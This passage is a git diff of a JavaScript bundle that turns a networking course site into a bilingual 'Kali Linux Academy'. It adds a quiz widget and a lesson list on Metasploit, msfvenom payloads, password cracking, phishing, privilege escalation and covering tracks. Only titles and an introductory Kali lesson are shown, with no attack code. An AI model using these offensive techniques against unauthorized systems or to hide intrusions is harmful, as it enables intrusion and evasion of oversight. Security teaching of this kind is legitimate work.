@@ -1,14 +1,14 @@
 "use strict";
 // ─────────────────────────────────────────────────────────────
-// NETWORK ACADEMY — Main Bundle
+// KALI LINUX ACADEMY — Main Bundle
 // ─────────────────────────────────────────────────────────────
 const {useState,useEffect,useRef,useCallback,createContext,useContext}=React;
 
 // ── Constants ────────────────────────────────────────────────
-const PROG_KEY="na_progress",ROUTE_KEY="na_route",THEME_KEY="na_theme",LANG_KEY="na_lang";
+const PROG_KEY="ka_progress",ROUTE_KEY="ka_route",THEME_KEY="ka_theme",LANG_KEY="ka_lang";
 const AI_KEYS_STORE="wa_ai_keys",AI_ACTIVE_STORE="wa_ai_active_id";
 
-// ── AI helpers (shares keys with Windows Academy) ─────────────
+// ── AI helpers (shares keys with Windows/Network Academy) ─────
 function loadAiKeys(){try{const s=localStorage.getItem(AI_KEYS_STORE);if(s)return JSON.parse(s);}catch{}return[];}
 function getActiveAiKey(){const k=loadAiKeys();if(!k.length)return null;const id=localStorage.getItem(AI_ACTIVE_STORE)||"";return k.find(x=>x.id===id)||k[0];}
 async function callAI(prompt){
@@ -39,6 +39,9 @@ function t(lang,uz,en){return lang==="en"?en:uz;}
 const ICONS={
   shield:"M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3z",
   network:"M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z",
+  terminal:"M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10zM6 10l1.4-1.4L11 12.2l-3.6 3.6L6 14.4l2.2-2.2L6 10zm6 4.5h5V16h-5z",
+  target:"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z",
+  bug:"M20 8h-2.81c-.45-.78-1.07-1.45-1.82-1.96L17 4.41 15.59 3l-2.17 2.17C12.96 5.06 12.49 5 12 5c-.49 0-.96.06-1.41.17L8.41 3 7 4.41l1.62 1.63C7.88 6.55 7.26 7.22 6.81 8H4v2h2.09c-.05.33-.09.66-.09 1v1H4v2h2v1c0 .34.04.67.09 1H4v2h2.81c1.04 1.79 2.97 3 5.19 3s4.15-1.21 5.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20V8zm-6 8h-4v-2h4v2zm0-4h-4v-2h4v2z",
   lock:"M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z",
   star:"M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z",
   code:"M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z",
@@ -59,226 +62,309 @@ function Icon({name,size=16,style={}}){const d=ICONS[name]||ICONS.star;return Re
 // ── Core UI components ─────────────────────────────────────────
 function H2({num,children}){return React.createElement("h2",{style:{fontFamily:"var(--font-display)",fontSize:18,fontWeight:700,margin:"28px 0 10px",color:"var(--text-0)",display:"flex",alignItems:"center",gap:10}},num&&React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",fontWeight:900}},num),children);}
 function P({children,style={}}){return React.createElement("p",{style:{fontSize:13.5,lineHeight:1.75,color:"var(--text-1)",margin:"0 0 14px",...style}},children);}
-function Term({children}){return React.createElement("code",{style:{background:"rgba(0,212,255,0.1)",border:"1px solid var(--accent-border)",borderRadius:6,padding:"1px 6px",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},children);}
+function Term({children}){return React.createElement("code",{style:{background:"rgba(168,85,247,0.12)",border:"1px solid var(--accent-border)",borderRadius:6,padding:"1px 6px",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},children);}
 function Terminal({children}){return React.createElement("pre",{style:{background:"rgba(0,0,0,0.5)",border:"1px solid var(--border)",borderRadius:10,padding:"14px 16px",fontFamily:"var(--font-mono)",fontSize:12,color:"#7effb2",overflowX:"auto",margin:"12px 0",lineHeight:1.65}},children);}
 function InfoBox({children,color="var(--accent)"}){return React.createElement("div",{style:{background:`${color}0d`,border:`1px solid ${color}33`,borderRadius:12,padding:"12px 16px",margin:"12px 0",fontSize:12.5,color:"var(--text-1)",lineHeight:1.7}},children);}
 
+// ── Quiz ──────────────────────────────────────────────────────
+function Quiz({q,opts,correct,exp}){
+  const lang=useLang();
+  const [sel,setSel]=useState(null);
+  const tx=x=>x==null?"":typeof x==="string"?x:t(lang,x.uz,x.en);
+  return React.createElement("div",{style:{margin:"18px 0",padding:"16px 18px",background:"var(--surface)",border:"1px solid var(--accent-border)",borderRadius:14}},
+    React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8,marginBottom:12}},
+      React.createElement(Icon,{name:"spark",size:14,style:{color:"var(--accent)"}}),
+      React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700,letterSpacing:1}},t(lang,"BILIMNI TEKSHIRING","QUICK QUIZ"))
+    ),
+    React.createElement("div",{style:{fontSize:13.5,fontWeight:600,color:"var(--text-0)",marginBottom:12,lineHeight:1.6}},tx(q)),
+    opts.map((o,i)=>{
+      const chosen=sel===i,isCorrect=i===correct;
+      const bg=sel==null?"var(--bg-2)":isCorrect?"rgba(0,255,136,0.12)":chosen?"rgba(255,58,94,0.12)":"var(--bg-2)";
+      const bd=sel==null?"var(--border)":isCorrect?"#00ff88":chosen?"var(--c-attack)":"var(--border)";
+      return React.createElement("button",{key:i,onClick:()=>sel==null&&setSel(i),disabled:sel!=null,
+        style:{display:"flex",alignItems:"center",gap:10,width:"100%",boxSizing:"border-box",textAlign:"left",marginBottom:7,padding:"10px 12px",borderRadius:9,cursor:sel==null?"pointer":"default",appearance:"none",border:`1.5px solid ${bd}`,background:bg,color:"var(--text-0)",fontSize:12.5}},
+        React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)",fontWeight:700}},String.fromCharCode(65+i)),
+        React.createElement("span",{style:{flex:1}},tx(o)),
+        sel!=null&&isCorrect&&React.createElement(Icon,{name:"check",size:14,style:{color:"#00ff88"}}),
+        sel!=null&&chosen&&!isCorrect&&React.createElement(Icon,{name:"x",size:14,style:{color:"var(--c-attack)"}})
+      );
+    }),
+    sel!=null&&React.createElement("div",{style:{marginTop:10,padding:"10px 12px",borderRadius:9,background:sel===correct?"rgba(0,255,136,0.08)":"rgba(255,58,94,0.08)",border:`1px solid ${sel===correct?"rgba(0,255,136,0.3)":"rgba(255,58,94,0.3)"}`,fontSize:12,color:"var(--text-1)",lineHeight:1.6}},
+      React.createElement("strong",{style:{color:sel===correct?"#00ff88":"var(--c-attack)"}},sel===correct?t(lang,"To'g'ri! ","Correct! "):t(lang,"Noto'g'ri. ","Incorrect. ")),
+      tx(exp))
+  );
+}
+
 // ── Lessons data ──────────────────────────────────────────────
 const LESSONS={
-  1:{num:"L01",sec:1,uz:"OSI Modeli",en:"OSI Model",sub:"7 ta qatlam va ularning vazifalari"},
-  2:{num:"L02",sec:1,uz:"TCP/IP Protokol",en:"TCP/IP Protocol",sub:"Internet protokol to'plami"},
-  3:{num:"L03",sec:1,uz:"IP Manzillash",en:"IP Addressing",sub:"IPv4, IPv6, CIDR, subnetting"},
-  4:{num:"L04",sec:1,uz:"DNS",en:"DNS",sub:"Domen nomlari tizimi qanday ishlaydi"},
-  5:{num:"L05",sec:1,uz:"HTTP/HTTPS",en:"HTTP/HTTPS",sub:"Veb protokollari va TLS asoslari"},
-  6:{num:"L06",sec:1,uz:"ARP",en:"ARP",sub:"Manzil aniqlash protokoli"},
-  7:{num:"L07",sec:1,uz:"DHCP",en:"DHCP",sub:"Dinamik xost konfiguratsiyasi"},
-  8:{num:"L08",sec:1,uz:"Routing",en:"Routing",sub:"Paketlarni yo'naltirish asoslari"},
-  9:{num:"L09",sec:1,uz:"Switching va VLAN",en:"Switching & VLAN",sub:"Kommutatsiya va virtual tarmoqlar"},
-  10:{num:"L10",sec:1,uz:"NAT/PAT",en:"NAT/PAT",sub:"Tarmoq manzillarini tarjima qilish"},
-  11:{num:"L11",sec:1,uz:"Tarmoq topologiyalari",en:"Network Topologies",sub:"Bus, Star, Ring, Mesh, Hybrid"},
-  12:{num:"L12",sec:1,uz:"Simsiz tarmoqlar",en:"Wireless Networks",sub:"WiFi standartlari, WPA2, WPA3"},
-  13:{num:"L13",sec:2,uz:"Firewall",en:"Firewall",sub:"Tarmoq xavfsizlik devori turlari"},
-  14:{num:"L14",sec:2,uz:"VPN",en:"VPN",sub:"Virtual xususiy tarmoq protokollari"},
-  15:{num:"L15",sec:2,uz:"SSL/TLS",en:"SSL/TLS",sub:"Xavfsiz ulanish protokoli"},
-  16:{num:"L16",sec:2,uz:"IDS/IPS",en:"IDS/IPS",sub:"Bosqinlarni aniqlash va oldini olish"},
-  17:{num:"L17",sec:2,uz:"DMZ",en:"DMZ",sub:"Demilitarizatsiya zonasi arxitekturasi"},
-  18:{num:"L18",sec:2,uz:"802.1X",en:"802.1X NAC",sub:"Tarmoqqa kirish nazorati"},
-  19:{num:"L19",sec:2,uz:"Packet Filtering",en:"Packet Filtering",sub:"Paket filtrlash qoidalari"},
-  20:{num:"L20",sec:2,uz:"Proxy Serverlar",en:"Proxy Servers",sub:"Forward, reverse, transparent proxy"},
-  21:{num:"L21",sec:2,uz:"Zero Trust",en:"Zero Trust Network",sub:"Ishonchsiz tarmoq arxitekturasi"},
-  22:{num:"L22",sec:3,uz:"Port Scanning",en:"Port Scanning",sub:"Nmap bilan portlarni skanerlash"},
-  23:{num:"L23",sec:3,uz:"Network Enumeration",en:"Network Enumeration",sub:"Tarmoq elementlarini aniqlash"},
-  24:{num:"L24",sec:3,uz:"ARP Spoofing",en:"ARP Spoofing",sub:"ARP zaharlash hujumi va himoya"},
-  25:{num:"L25",sec:3,uz:"MITM hujumi",en:"MITM Attacks",sub:"O'rtadagi odam hujumlari"},
-  26:{num:"L26",sec:3,uz:"DNS Spoofing",en:"DNS Spoofing",sub:"DNS zaharlash hujumi"},
-  27:{num:"L27",sec:3,uz:"DoS/DDoS",en:"DoS/DDoS",sub:"Xizmatni rad etish hujumlari"},
-  28:{num:"L28",sec:3,uz:"Wireshark",en:"Wireshark",sub:"Tarmoq trafigini tahlil qilish"},
-  29:{num:"L29",sec:3,uz:"Wireless Attacks",en:"Wireless Attacks",sub:"WiFi hujumlari va himoya usullari"},
-  30:{num:"L30",sec:3,uz:"Network Forensics",en:"Network Forensics",sub:"Tarmoq sud-tibbiyoti tahlili"},
+  1:{num:"L01",sec:1,uz:"Kali Linux nima?",en:"What is Kali Linux?",sub:"Kali'ga kirish, tarix va use-case'lar"},
+  2:{num:"L02",sec:1,uz:"Kali'ni O'rnatish",en:"Installing Kali",sub:"VirtualBox, VMware, WSL va live USB"},
+  3:{num:"L03",sec:1,uz:"Buyruq Qatori Asoslari",en:"Command Line Basics",sub:"ls, cd, pwd, cat, grep, pipe va redirect"},
+  4:{num:"L04",sec:1,uz:"Linux Fayl Tizimi",en:"Linux File System",sub:"FHS: /etc, /var, /home, /usr, /root"},
+  5:{num:"L05",sec:1,uz:"Foydalanuvchilar & Ruxsatlar",en:"Users & Permissions",sub:"chmod, chown, sudo, /etc/passwd"},
+  6:{num:"L06",sec:1,uz:"Paketlarni Boshqarish (apt)",en:"Package Management (apt)",sub:"apt update, install, dpkg, repolar"},
+  7:{num:"L07",sec:1,uz:"Bash Skripting",en:"Bash Scripting",sub:"O'zgaruvchilar, tsikllar, shartlar, funksiyalar"},
+  8:{num:"L08",sec:1,uz:"Tarmoq Asoslari",en:"Networking Basics",sub:"ip, ifconfig, ping, netstat, ss"},
+  9:{num:"L09",sec:1,uz:"Xizmatlar (Services)",en:"Services",sub:"systemctl, SSH, Apache, PostgreSQL"},
+  10:{num:"L10",sec:1,uz:"Kali Vositalari Sharhi",en:"Kali Tools Overview",sub:"Menyu bo'yicha 600+ vosita toifasi"},
+  11:{num:"L11",sec:2,uz:"Nmap",en:"Nmap",sub:"Port skanerlash va xizmat aniqlash"},
+  12:{num:"L12",sec:2,uz:"Netdiscover",en:"Netdiscover",sub:"ARP orqali tirik xostlarni topish"},
+  13:{num:"L13",sec:2,uz:"Masscan",en:"Masscan",sub:"Ultra-tez internet miqyosidagi skan"},
+  14:{num:"L14",sec:2,uz:"DNS Enumeratsiya",en:"DNS Enumeration",sub:"dnsenum, dnsrecon, zona transfer"},
+  15:{num:"L15",sec:2,uz:"theHarvester",en:"theHarvester",sub:"OSINT: email, subdomen, xostlar"},
+  16:{num:"L16",sec:2,uz:"Nikto",en:"Nikto",sub:"Veb-server zaifliklari skaneri"},
+  17:{num:"L17",sec:2,uz:"WhatWeb",en:"WhatWeb",sub:"Veb-texnologiyalarni aniqlash"},
+  18:{num:"L18",sec:2,uz:"enum4linux",en:"enum4linux",sub:"Windows/Samba enumeratsiya"},
+  19:{num:"L19",sec:2,uz:"SMB Enumeratsiya",en:"SMB Enumeration",sub:"smbclient, smbmap, share'lar"},
+  20:{num:"L20",sec:2,uz:"Wireshark",en:"Wireshark",sub:"Trafik tahlili va paket ushlash"},
+  21:{num:"L21",sec:3,uz:"Metasploit Framework",en:"Metasploit Framework",sub:"msfconsole, modullar, Meterpreter"},
+  22:{num:"L22",sec:3,uz:"msfvenom",en:"msfvenom",sub:"Payload generatsiya va kodlash"},
+  23:{num:"L23",sec:3,uz:"searchsploit & Exploit-DB",en:"searchsploit & Exploit-DB",sub:"Ma'lum ekspluatlarni topish"},
+  24:{num:"L24",sec:3,uz:"Hydra",en:"Hydra",sub:"Onlayn parol brute-force"},
+  25:{num:"L25",sec:3,uz:"John the Ripper",en:"John the Ripper",sub:"Parol xeshlarini buzish (CPU)"},
+  26:{num:"L26",sec:3,uz:"Hashcat",en:"Hashcat",sub:"GPU bilan xesh buzish"},
+  27:{num:"L27",sec:3,uz:"Burp Suite",en:"Burp Suite",sub:"Veb-ilova proxy va tahlil"},
+  28:{num:"L28",sec:3,uz:"Social Engineering (SET)",en:"Social Engineering (SET)",sub:"Fishing va inson omili hujumlari"},
+  29:{num:"L29",sec:3,uz:"Imtiyozlarni Oshirish",en:"Privilege Escalation",sub:"SUID, sudo, kernel exploit asoslari"},
+  30:{num:"L30",sec:3,uz:"Izlarni Yashirish & Hisobot",en:"Covering Tracks & Reporting",sub:"Loglar, tozalash va pentest hisoboti"},
 };
 
 const SECTIONS={
-  1:{num:"01",uz:"Tarmoq Asoslari",en:"Network Fundamentals",color:"var(--c-system)",icon:"network",count:12,
-     descUz:"OSI modeli, TCP/IP, IP manzillash, DNS, HTTP va tarmoqning asosiy protokollarini chuqur o'rganing.",
-     descEn:"Master OSI model, TCP/IP, IP addressing, DNS, HTTP and core network protocols."},
-  2:{num:"02",uz:"Tarmoq Xavfsizligi",en:"Network Security",color:"var(--c-auth)",icon:"shield",count:9,
-     descUz:"Firewall, VPN, SSL/TLS, IDS/IPS va tarmoq xavfsizligini ta'minlash usullarini o'rganing.",
-     descEn:"Learn Firewall, VPN, SSL/TLS, IDS/IPS and methods to secure your network."},
-  3:{num:"03",uz:"Tarmoq Hujumlari",en:"Network Attacks",color:"var(--c-attack)",icon:"cpu",count:9,
-     descUz:"Nmap, ARP spoofing, MITM, DDoS va boshqa tarmoq hujumlarini va ulardan himoyalanishni o'rganing.",
-     descEn:"Learn Nmap, ARP spoofing, MITM, DDoS and other network attacks with defense techniques."},
+  1:{num:"01",uz:"Kali Asoslari",en:"Kali Basics",color:"var(--c-system)",icon:"terminal",count:10,
+     descUz:"Kali'ni o'rnatish, Linux buyruq qatori, fayl tizimi, ruxsatlar, apt va bash skriptlashni o'rganing.",
+     descEn:"Learn Kali installation, the Linux command line, file system, permissions, apt and bash scripting."},
+  2:{num:"02",uz:"Ma'lumot To'plash & Skanerlash",en:"Recon & Scanning",color:"var(--c-defense)",icon:"target",count:10,
+     descUz:"Nmap, Masscan, DNS enumeratsiya, theHarvester, Nikto va SMB skanerlash bilan nishon haqida ma'lumot to'plang.",
+     descEn:"Gather intel on targets with Nmap, Masscan, DNS enumeration, theHarvester, Nikto and SMB scanning."},
+  3:{num:"03",uz:"Ekspluatatsiya & Post",en:"Exploitation & Post",color:"var(--c-attack)",icon:"bug",count:10,
+     descUz:"Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite va imtiyozlarni oshirish bilan ekspluatatsiyani o'rganing.",
+     descEn:"Master exploitation with Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite and privilege escalation."},
 };
 
-// ── Lesson content: L01 OSI Model ────────────────────────────
+// ── Lesson content: L01 What is Kali Linux ───────────────────
 function LessonL01(){
   const lang=useLang();
-  const layers=[
-    {n:7,name:"Application",uz:"Ilova qatlami",proto:"HTTP, FTP, SMTP, DNS, SNMP",desc:"Foydalanuvchi ilovalari bilan to'g'ridan-to'g'ri ishlaydi",color:"#ff6b6b"},
-    {n:6,name:"Presentation",uz:"Taqdimot qatlami",proto:"SSL/TLS, JPEG, MP4, ASCII",desc:"Ma'lumotlarni formatlash, shifrlash va siqish",color:"#ffa94d"},
-    {n:5,name:"Session",uz:"Sessiya qatlami",proto:"NetBIOS, RPC, SQL",desc:"Ulanishlarni o'rnatish, boshqarish va tugatish",color:"#ffd43b"},
-    {n:4,name:"Transport",uz:"Transport qatlami",proto:"TCP, UDP",desc:"End-to-end ulanish, portlar, oqim nazorati",color:"#69db7c"},
-    {n:3,name:"Network",uz:"Tarmoq qatlami",proto:"IP, ICMP, OSPF, BGP",desc:"IP manzillash va paketlarni yo'naltirish",color:"#4dabf7"},
-    {n:2,name:"Data Link",uz:"Ma'lumotlar havolasi",proto:"Ethernet, WiFi, PPP, ARP",desc:"MAC manzillash, kadrlar va fizik ulanish xatolarini tuzatish",color:"#9775fa"},
-    {n:1,name:"Physical",uz:"Fizik qatlam",proto:"Ethernet kabeli, Optik, Radio",desc:"Bitlarni fizik signal sifatida uzatish",color:"#f783ac"},
+  const distros=[
+    {name:"Kali Linux",base:"Debian",uz:"Pentest va xavfsizlik auditi uchun. 600+ oldindan o'rnatilgan vosita.",en:"For pentesting & security auditing. 600+ pre-installed tools.",color:"#a855f7"},
+    {name:"Parrot OS",base:"Debian",uz:"Pentest + maxfiylik va anonimlik vositalari. Yengilroq tizim.",en:"Pentest + privacy/anonymity tools. Lighter footprint.",color:"#00d4ff"},
+    {name:"BlackArch",base:"Arch",uz:"2800+ vosita, tajribali foydalanuvchilar uchun.",en:"2800+ tools, aimed at advanced users.",color:"#ff3a5e"},
+    {name:"Ubuntu",base:"Debian",uz:"Umumiy maqsadli ish stoli/server OS — pentest uchun mo'ljallanmagan.",en:"General-purpose desktop/server OS — not built for pentesting.",color:"#ff9145"},
+  ];
+  const uses=[
+    {icon:"target",uz:"Penetration Testing — tizim zaifliklarini ruxsat bilan sinash",en:"Penetration Testing — probing system weaknesses with authorization"},
+    {icon:"wifi",uz:"Simsiz tarmoq auditi — WiFi xavfsizligini baholash",en:"Wireless auditing — assessing WiFi security"},
+    {icon:"database",uz:"Digital Forensics — raqamli dalillarni tahlil qilish",en:"Digital Forensics — analyzing digital evidence"},
+    {icon:"code",uz:"Reverse Engineering — dasturlarni teskari tahlil qilish",en:"Reverse Engineering — dissecting binaries and malware"},
   ];
   return React.createElement("section",null,
-    React.createElement(H2,{num:"§1"},t(lang,"OSI modeli nima?","What is the OSI Model?")),
+    React.createElement(H2,{num:"§1"},t(lang,"Kali Linux nima?","What is Kali Linux?")),
     React.createElement(P,null,t(lang,
-      "OSI (Open Systems Interconnection) modeli — tarmoq aloqasini 7 ta mantiqiy qatlamga bo'lib tushuntiruvchi konseptual freymvork. Bu model turli ishlab chiqaruvchilar va protokollar o'rtasida muloqotni standartlashtirish uchun ISO tomonidan 1984 yilda yaratilgan.",
-      "The OSI (Open Systems Interconnection) model is a conceptual framework that divides network communication into 7 logical layers. Created by ISO in 1984, it standardizes communication between different vendors and protocols."
+      "Kali Linux — Debian asosidagi, bepul va ochiq kodli operatsion tizim bo'lib, maxsus penetration testing (kirib borish sinovi) va xavfsizlik auditi uchun mo'ljallangan. U Offensive Security kompaniyasi tomonidan ishlab chiqilgan va mashhur BackTrack Linux ning vorisi hisoblanadi. Kali 600 dan ortiq xavfsizlik vositasi bilan oldindan jihozlangan.",
+      "Kali Linux is a free, open-source, Debian-based operating system purpose-built for penetration testing and security auditing. Developed by Offensive Security, it is the successor to the well-known BackTrack Linux and ships with 600+ pre-installed security tools."
     )),
     React.createElement(InfoBox,{color:"var(--accent)"},
-      t(lang,"Eslab qolish uchun:","Mnemonic to remember layers:"),
-      React.createElement("br",null),
-      React.createElement("strong",null,"\""),
-      React.createElement("span",{style:{color:"#ff6b6b"}},"A"),
-      React.createElement("span",{style:{color:"#ffa94d"}},"ll"),
-      " ",
-      React.createElement("span",{style:{color:"#ffd43b"}},"P"),
-      React.createElement("span",{style:{color:"#ffd43b"}},"eople"),
-      " ",
-      React.createElement("span",{style:{color:"#69db7c"}},"S"),
-      React.createElement("span",{style:{color:"#69db7c"}},"eem"),
-      " ",
-      React.createElement("span",{style:{color:"#4dabf7"}},"T"),
-      React.createElement("span",{style:{color:"#4dabf7"}},"o"),
-      " ",
-      React.createElement("span",{style:{color:"#9775fa"}},"N"),
-      React.createElement("span",{style:{color:"#9775fa"}},"eed"),
-      " ",
-      React.createElement("span",{style:{color:"#f783ac"}},"D"),
-      React.createElement("span",{style:{color:"#f783ac"}},"ata"),
-      " ",
-      React.createElement("span",{style:{color:"#ff6b6b"}},"P"),
-      React.createElement("span",{style:{color:"#ff6b6b"}},"rocessing\""),
-      React.createElement("br",null),
-      React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,opacity:0.7}},
-        t(lang,"(7→1: Application, Presentation, Session, Transport, Network, Data Link, Physical)","(7→1: Application, Presentation, Session, Transport, Network, Data Link, Physical)"))
+      React.createElement("strong",null,t(lang,"Muhim faktlar: ","Key facts: ")),
+      t(lang,
+        "Kali \"rolling release\" modelida ishlaydi — tizim doimiy yangilanib turadi. U jonli (live) USB, virtual mashina, WSL yoki ARM qurilmalarida ishlashi mumkin. Zamonaviy Kali oddiy foydalanuvchi (kali) hisobi bilan keladi, root emas.",
+        "Kali follows a rolling-release model — it updates continuously. It can run from a live USB, a virtual machine, WSL, or ARM devices. Modern Kali defaults to a non-root user (kali), not root."
+      )
     ),
-    React.createElement(H2,{num:"§2"},t(lang,"7 ta qatlam","The 7 Layers")),
-    layers.map(l=>React.createElement("div",{key:l.n,style:{display:"flex",gap:12,marginBottom:8,padding:"10px 14px",background:"var(--surface)",border:`1px solid ${l.color}33`,borderRadius:10,alignItems:"flex-start"}},
-      React.createElement("div",{style:{width:28,height:28,borderRadius:8,background:l.color+"22",border:`1.5px solid ${l.color}`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,fontFamily:"var(--font-mono)",fontSize:11,fontWeight:900,color:l.color}},l.n),
+    React.createElement(H2,{num:"§2"},t(lang,"Kali vs boshqa distributivlar","Kali vs other distros")),
+    distros.map((dctx,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"12px 14px",background:"var(--surface)",border:`1px solid ${dctx.color}33`,borderRadius:10,alignItems:"flex-start"}},
+      React.createElement("div",{style:{width:10,height:10,borderRadius:"50%",background:dctx.color,marginTop:4,flexShrink:0,boxShadow:`0 0 10px ${dctx.color}`}}),
       React.createElement("div",{style:{flex:1}},
         React.createElement("div",{style:{fontWeight:700,fontSize:13,color:"var(--text-0)",marginBottom:2}},
-          `${l.name}`,React.createElement("span",{style:{fontSize:11,color:"var(--text-2)",marginLeft:8,fontWeight:400}},l.uz)),
-        React.createElement("div",{style:{fontSize:11.5,color:"var(--text-2)",marginBottom:3}},l.desc),
-        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:l.color,opacity:0.85}},l.proto)
+          dctx.name,React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:dctx.color,marginLeft:8,fontWeight:600}},dctx.base)),
+        React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",lineHeight:1.55}},t(lang,dctx.uz,dctx.en))
       )
     )),
-    React.createElement(H2,{num:"§3"},t(lang,"Ma'lumot qanday harakatlanadi?","How data travels?")),
+    React.createElement(H2,{num:"§3"},t(lang,"Nima uchun ishlatiladi?","What is it used for?")),
+    uses.map((u,i)=>React.createElement("div",{key:i,style:{display:"flex",alignItems:"center",gap:12,marginBottom:7,padding:"10px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
+      React.createElement("div",{style:{width:32,height:32,borderRadius:8,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}},
+        React.createElement(Icon,{name:u.icon,size:16,style:{color:"var(--accent)"}})),
+      React.createElement("div",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.55}},t(lang,u.uz,u.en))
+    )),
+    React.createElement(H2,{num:"§4"},t(lang,"Birinchi buyruqlar","First commands")),
     React.createElement(P,null,t(lang,
-      "Yuboruvchi tomonida ma'lumot 7-qatlamdan 1-qatlamga qarab har bir qatlamda sarlavha (header) qo'shiladi — bu encapsulation deyiladi. Qabul qiluvchi tomonida esa 1-qatlamdan 7-qatlamga qarab har bir sarlavha olib tashlanadi — bu decapsulation.",
-      "On the sender side, data travels from layer 7 to layer 1, with each layer adding a header — this is called encapsulation. On the receiver side, it travels from layer 1 to layer 7, with each layer removing its header — this is decapsulation."
+      "Kali'ni ishga tushirgach, terminal ochib tizimni tekshiring va yangilang. Quyidagi buyruqlar har bir Kali foydalanuvchisi bilishi shart bo'lgan asosiy amallardir:",
+      "After booting Kali, open a terminal to inspect and update the system. These commands are the essentials every Kali user should know:"
     )),
     React.createElement(Terminal,null,
-`Yuboruvchi (Sender)          Qabul qiluvchi (Receiver)
-┌─────────────────┐          ┌─────────────────┐
-│  7. Application │ ──data─► │  7. Application │
-│  6. Presentation│          │  6. Presentation│
-│  5. Session     │          │  5. Session     │
-│  4. Transport   │          │  4. Transport   │
-│  3. Network     │          │  3. Network     │
-│  2. Data Link   │          │  2. Data Link   │
-│  1. Physical    │ ══════►  │  1. Physical    │
-└─────────────────┘   Kabel  └─────────────────┘`
-    ),
-    React.createElement(H2,{num:"§4"},t(lang,"TCP/IP vs OSI","TCP/IP vs OSI")),
-    React.createElement(P,null,t(lang,
-      "Amalda internet TCP/IP modelini ishlatadi — u OSI ning 7 qatlamini 4 qatlamga soddalashtirgan:",
-      "In practice, the internet uses the TCP/IP model — it simplifies OSI's 7 layers into 4 layers:"
-    )),
-    React.createElement("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"12px 0"}},
-      React.createElement("div",{style:{padding:14,background:"rgba(0,212,255,0.06)",border:"1px solid rgba(0,212,255,0.2)",borderRadius:10}},
-        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",marginBottom:8,fontWeight:700}},"OSI MODEL (7 layers)"),
-        ["7. Application","6. Presentation","5. Session","4. Transport","3. Network","2. Data Link","1. Physical"].map((l,i)=>
-          React.createElement("div",{key:i,style:{fontSize:11.5,padding:"3px 0",color:"var(--text-1)",borderBottom:"1px solid var(--border)"}},l))
-      ),
-      React.createElement("div",{style:{padding:14,background:"rgba(100,255,100,0.06)",border:"1px solid rgba(100,255,100,0.2)",borderRadius:10}},
-        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"#69db7c",marginBottom:8,fontWeight:700}},"TCP/IP MODEL (4 layers)"),
-        [
-          {l:"4. Application",sub:"→ OSI 5,6,7"},
-          {l:"3. Transport",sub:"→ OSI 4"},
-          {l:"2. Internet",sub:"→ OSI 3"},
-          {l:"1. Network Access",sub:"→ OSI 1,2"},
-        ].map(({l,sub},i)=>
-          React.createElement("div",{key:i,style:{fontSize:11.5,padding:"3px 0",color:"var(--text-1)",borderBottom:"1px solid var(--border)"}},
-            l,React.createElement("span",{style:{fontSize:10,color:"#69db7c",marginLeft:6,opacity:0.7}},sub)))
-      )
-    )
-  );
-}
+`# Kali versiyasi va release ma'lumoti
+cat /etc/os-release
 
-// ── Lesson L13: Firewall ──────────────────────────────────────
-function LessonL13(){
-  const lang=useLang();
-  return React.createElement("section",null,
-    React.createElement(H2,{num:"§1"},t(lang,"Firewall nima?","What is a Firewall?")),
-    React.createElement(P,null,t(lang,
-      "Firewall — tarmoq trafigini oldindan belgilangan qoidalar asosida filtrlash orqali ruxsatsiz kirishni bloklaydi. U ichki tarmoq bilan tashqi tarmoq o'rtasida xavfsizlik devori vazifasini bajaradi.",
-      "A firewall is a network security device that monitors and filters incoming and outgoing network traffic based on pre-established security rules, acting as a barrier between internal and external networks."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Firewall turlari","Types of Firewalls")),
-    [
